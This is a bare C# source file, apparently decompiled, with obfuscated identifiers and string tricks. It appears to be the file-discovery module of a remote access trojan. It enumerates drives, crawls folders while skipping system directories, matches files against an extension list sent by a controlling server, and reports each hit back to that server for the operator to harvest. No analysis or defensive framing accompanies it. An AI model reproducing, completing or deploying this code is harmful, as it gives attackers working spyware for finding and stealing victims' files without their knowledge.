using System;
using System.Collections.Generic;
using System.IO;

namespace dtiardhues;

internal class DLRZRIVF
{
	public MLREDM iserver;

	public List<string> dtiardhuesfExts = new List<string>();

	public List<string> dtiardhuesnotFilders = new List<string>();

	public string dtiardhuesmainPath;

	public int dtiardhuessIndx = 0;

	public List<string> dtiardhuessFiles = new List<string>();

	public string dtiardhuesfilesLogs = DLAONIF.dtiardhuesfilesLogs;

	public int dtiardhuesfIndx = 0;

	public bool dtiardhuesreaging = false;

	public string dtiardhueslookupDrives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|dtiardhues".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public bool dtiardhuesseeAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public DLRZRIVF()
	{
		dtiardhuesnotFilders.Add("msocache|dtiardhues".Split(new char[1] { '|' })[0]);
		dtiardhuesnotFilders.Add("recoveDSDF|dtiardhues".Split(new char[1] { '|' })[0]);
		dtiardhuesnotFilders.Add("documents and settings|dtiardhues".Split(new char[1] { '|' })[0]);
		dtiardhuesnotFilders.Add("program files|dtiardhues".Split(new char[1] { '|' })[0]);
		dtiardhuesnotFilders.Add("system volume information|dtiardhues".Split(new char[1] { '|' })[0]);
		dtiardhuesnotFilders.Add("$recycle.bin|dtiardhues".Split(new char[1] { '|' })[0]);
		dtiardhuesnotFilders.Add("windows|dtiardhues".Split(new char[1] { '|' })[0]);
		dtiardhuesnotFilders.Add("program files (x86)|dtiardhues".Split(new char[1] { '|' })[0]);
		dtiardhuesnotFilders.Add("programdata|dtiardhues".Split(new char[1] { '|' })[0]);
	}

	public IEnumerable<string> dtiardhuesaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.dtiardhuesautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (dtiardhuesseeAccess(text) && !dtiardhuesnotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void dtiardhuessendSearch(string path)
	{
		try
		{
			foreach (string item in dtiardhuesaddFiles(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (dtiardhuesfExts.Contains(text.ToLower()))
				{
					string text2 = iserver.dtiardhuesfile_info(item, ret: true);
					iserver.dtiardhuespush_data(null, "dtiardhues-searf=|dtiardhues".Split(new char[1] { '|' })[0] + item + "<FILE_AUTO<|dtiardhues".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.dtiardhuesautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string dtiardhueslookupFiles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|dtiardhues".Split(new char[1] { '|' })[0];
			}
		}
		else
		{
			text = null;
		}
		return text;
	}

	public string dtiardhuescheckFolders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (dtiardhuesseeAccess(text2))
				{
					text = text + text2 + ">|dtiardhues".Split(new char[1] { '|' })[0];
				}
			}
			return text;
		}
		return null;
	}

	public void dtiardhueslookFiles(string tempStr)
	{
		iserver.dtiardhuesautCnls = false;
		dtiardhuesfExts.Clear();
		dtiardhuessFiles.Clear();
		dtiardhuesfIndx = 0;
		dtiardhuessIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				dtiardhuesfExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			dtiardhuesreaging = true;
			dtiardhuessendSearch(array[1]);
			dtiardhuesreaging = false;
			iserver.dtiardhuespush_data(null, "dtiardhues-seard=searched|dtiardhues".Split(new char[1] { '|' })[0]);
		}
	}
}
